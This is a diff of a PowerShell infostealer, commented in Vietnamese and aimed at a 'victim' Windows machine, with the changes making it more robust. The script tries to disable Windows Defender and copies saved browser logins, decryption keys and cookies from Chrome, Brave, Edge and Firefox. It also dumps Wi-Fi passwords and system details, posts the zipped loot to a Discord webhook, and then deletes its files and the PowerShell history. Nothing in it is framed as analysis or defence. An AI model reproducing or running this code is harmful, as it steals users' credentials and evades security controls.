@@ -5,20 +5,27 @@ $WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnh
 # Thư mục tạm trên máy nạn nhân
 $destDir = "$env:TEMP\Exfil_$env:USERNAME"
 if (-Not (Test-Path $destDir)) {
-    New-Item -ItemType Directory -Path $destDir
+    New-Item -ItemType Directory -Path $destDir -Force
 }
 
+# Tạo thư mục con
+$sysInfoDir = "$destDir\SystemInfo"
+New-Item -ItemType Directory -Path $sysInfoDir -Force
+
 # Tắt Windows Defender
-Set-MpPreference -DisableRealtimeMonitoring $true
-Add-MpPreference -ExclusionPath "$env:TEMP\"
-Set-MpPreference -ExclusionExtension "ps1"
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+} catch {}
 
 # ==========================================
 # DISCORD WEBHOOK FUNCTION
 # ==========================================
 function Send-DiscordFile {
     param([string]$FilePath, [string]$Description = "")
-    if (-Not (Test-Path $FilePath)) { return }
+    if (-Not (Test-Path $FilePath)) { 
+        Write-Host "[-] File not found: $FilePath"
+        return 
+    }
     try {
         $fileName = Split-Path $FilePath -Leaf
         $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
@@ -28,131 +35,161 @@ function Send-DiscordFile {
             files = @(@{ name = $fileName; content = $base64Content })
         } | ConvertTo-Json -Depth 10
         Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-    } catch {}
+        Write-Host "[+] Sent: $fileName"
+    } catch {
+        Write-Host "[-] Failed to send: $fileName"
+    }
 }
 
-# Function to copy browser files (đã sửa lỗi lock)
+# Function to copy browser files (dùng PowerShell thuần)
 function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
-    if (-Not (Test-Path $browserDestDir)) {
-        New-Item -ItemType Directory -Path $browserDestDir -Force
+    if (-Not (Test-Path $browserDir)) {
+        Write-Host "$browserName - Directory not found"
+        return
     }
+    
+    New-Item -ItemType Directory -Path $browserDestDir -Force | Out-Null
 
     foreach ($file in $filesToCopy) {
         $source = Join-Path -Path $browserDir -ChildPath $file
         if (Test-Path $source) {
-            # Xử lý file bị lock
-            $tempFile = "$env:TEMP\$([Guid]::NewGuid()).tmp"
-            cmd /c "copy `"$source`" `"$tempFile`"" 2>nul
-            if (Test-Path $tempFile) {
-                Copy-Item $tempFile (Join-Path -Path $browserDestDir -ChildPath $file) -Force
-                Remove-Item $tempFile -Force
-                Write-Host "$browserName - File copied: $file"
-            } else {
-                Copy-Item -Path $source -Destination $browserDestDir -Force
-                Write-Host "$browserName - File copied: $file"
+            try {
+                # Dùng Copy-Item với force
+                Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
+                Write-Host "$browserName - Copied: $file"
+            } catch {
+                # Nếu lỗi, thử dùng File.Copy
+                try {
+                    [System.IO.File]::Copy($source, (Join-Path $browserDestDir $file), $true)
+                    Write-Host "$browserName - Copied (alternative): $file"
+                } catch {
+                    Write-Host "$browserName - Failed to copy: $file"
+                }
             }
         } else {
-            Write-Host "$browserName - File not found: $file"
+            Write-Host "$browserName - Not found: $file"
         }
     }
 }
 
-# Configuration for Google Chrome
+# ==========================================
+# 1. GOOGLE CHROME
+# ==========================================
 $chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-$chromeFilesToCopy = @("Login Data")
-CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
+if (Test-Path $chromeDir) {
+    CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
+    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    if (Test-Path $localState) {
+        Copy-Item $localState "$destDir\Chrome\" -Force -ErrorAction SilentlyContinue
+    }
+}
 
-# Configuration for Brave
+# ==========================================
+# 2. BRAVE
+# ==========================================
 $braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
-$braveFilesToCopy = @("Login Data")
-CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue
-
-# Configuration for Firefox
-$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
-$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
-if ($firefoxProfile) {
-    $firefoxDir = $firefoxProfile.FullName
-    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
-    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
-} else {
-    Write-Host "Firefox - No profile found."
+if (Test-Path $braveDir) {
+    CopyBrowserFiles "Brave" $braveDir @("Login Data")
+    $localState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
+    if (Test-Path $localState) {
+        Copy-Item $localState "$destDir\Brave\" -Force -ErrorAction SilentlyContinue
+    }
 }
 
-# Configuration for Microsoft Edge
+# ==========================================
+# 3. FIREFOX
+# ==========================================
+$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $firefoxProfiles) {
+    $firefoxProfile = Get-ChildItem -Path $firefoxProfiles -Filter "*.default*" | Select-Object -First 1
+    if ($firefoxProfile) {
+        CopyBrowserFiles "Firefox" $firefoxProfile.FullName @("logins.json", "key4.db", "cookies.sqlite")
+    }
+}
+
+# ==========================================
+# 4. MICROSOFT EDGE
+# ==========================================
 $edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-$edgeFilesToCopy = @("Login Data")
-CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
-Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
-
-# Gather additional system information
-function GatherSystemInfo {
-    $sysInfoDir = "$destDir\SystemInfo"
-    if (-Not (Test-Path $sysInfoDir)) {
-        New-Item -ItemType Directory -Path $sysInfoDir -Force
+if (Test-Path $edgeDir) {
+    CopyBrowserFiles "Edge" $edgeDir @("Login Data")
+    $localState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+    if (Test-Path $localState) {
+        Copy-Item $localState "$destDir\Edge\" -Force -ErrorAction SilentlyContinue
     }
-
-    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
-    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
-    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
-    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
 }
-GatherSystemInfo
-
-# Retrieve Wi-Fi passwords
-function GetWifiPasswords {
-    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
-
-    $results = @()
-    foreach ($profile in $wifiProfiles) {
-        $profileDetails = netsh wlan show profile name="$profile" key=clear
-        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
-        $results += [PSCustomObject]@{
-            ProfileName = $profile
-            KeyContent  = $keyContent
-        }
-    }
-    $results | Format-Table -AutoSize
-    $results | Out-File -FilePath "$destDir\WiFi_Details.txt"
-}
-GetWifiPasswords
 
 # ==========================================
-# GỬI TOÀN BỘ DỮ LIỆU QUA DISCORD
+# 5. SYSTEM INFORMATION
 # ==========================================
+Write-Host "[+] Gathering system information..."
+Get-ComputerInfo | Out-File "$sysInfoDir\computer_info.txt" -ErrorAction SilentlyContinue
+Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyContinue
+Get-Service | Out-File "$sysInfoDir\service_list.txt" -ErrorAction SilentlyContinue
+Get-NetIPAddress | Out-File "$sysInfoDir\network_config.txt" -ErrorAction SilentlyContinue
+Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue
 
-# Gửi WiFi passwords
-Send-DiscordFile -FilePath "$destDir\WiFi_Details.txt" -Description "WiFi Passwords"
+# ==========================================
+# 6. WIFI PASSWORDS
+# ==========================================
+Write-Host "[+] Extracting WiFi passwords..."
+$wifiFile = "$destDir\WiFi_Details.txt"
+"="*60 | Out-File $wifiFile
+"WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
+"Extracted: $(Get-Date)" | Out-File $wifiFile -Append
+"="*60 | Out-File $wifiFile -Append
+
+$wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
+foreach ($profile in $wifiProfiles) {
+    $profileDetails = netsh wlan show profile name="$profile" key=clear
+    $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
+    if (-not $keyContent) { $keyContent = "No password (Open network)" }
+    "[$profile] $keyContent" | Out-File $wifiFile -Append
+}
+
+# ==========================================
+# 7. GỬI DỮ LIỆU QUA DISCORD
+# ==========================================
+Write-Host "[+] Sending data to Discord..."
+
+# Gửi WiFi
+if (Test-Path $wifiFile) {
+    Send-DiscordFile $wifiFile "WiFi Passwords"
+}
 
 # Gửi System Info
-Send-DiscordFile -FilePath "$destDir\SystemInfo\computer_info.txt" -Description "Computer Info"
-Send-DiscordFile -FilePath "$destDir\SystemInfo\process_list.txt" -Description "Process List"
-Send-DiscordFile -FilePath "$destDir\SystemInfo\service_list.txt" -Description "Service List"
-Send-DiscordFile -FilePath "$destDir\SystemInfo\network_config.txt" -Description "Network Config"
+Send-DiscordFile "$sysInfoDir\computer_info.txt" "Computer Info"
+Send-DiscordFile "$sysInfoDir\local_users.txt" "Local Users"
 
-# Gửi browser data
-$browsers = @("Chrome", "Brave", "Firefox", "Edge")
+# Gửi từng trình duyệt (nếu có dữ liệu)
+$browsers = @("Chrome", "Brave", "Edge", "Firefox")
 foreach ($browser in $browsers) {
-    $browserDir = Join-Path -Path $destDir -ChildPath $browser
+    $browserDir = "$destDir\$browser"
     if (Test-Path $browserDir) {
-        $zipPath = "$env:TEMP\$browser.zip"
-        Compress-Archive -Path "$browserDir\*" -DestinationPath $zipPath -Force
-        Send-DiscordFile -FilePath $zipPath -Description "$browser Credentials"
-        Remove-Item $zipPath -Force
+        $files = Get-ChildItem $browserDir -File
+        if ($files.Count -gt 0) {
+            $zipPath = "$env:TEMP\$browser-$env:USERNAME.zip"
+            Compress-Archive -Path "$browserDir\*" -DestinationPath $zipPath -Force
+            if (Test-Path $zipPath) {
+                Send-DiscordFile $zipPath "$browser Credentials"
+                Remove-Item $zipPath -Force
+            }
+        }
     }
 }
 
 # ==========================================
-# DỌN DẸP
+# 8. DỌN DẸP
 # ==========================================
-
-# Xóa thư mục tạm
+Write-Host "[+] Cleaning up..."
 Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
-
-# Xóa lịch sử PowerShell
 Clear-History
-Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+$historyPath = (Get-PSReadLineOption).HistorySavePath
+if ($historyPath -and (Test-Path $historyPath)) {
+    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+}
+
+Write-Host "[+] Done!"
 
 exit
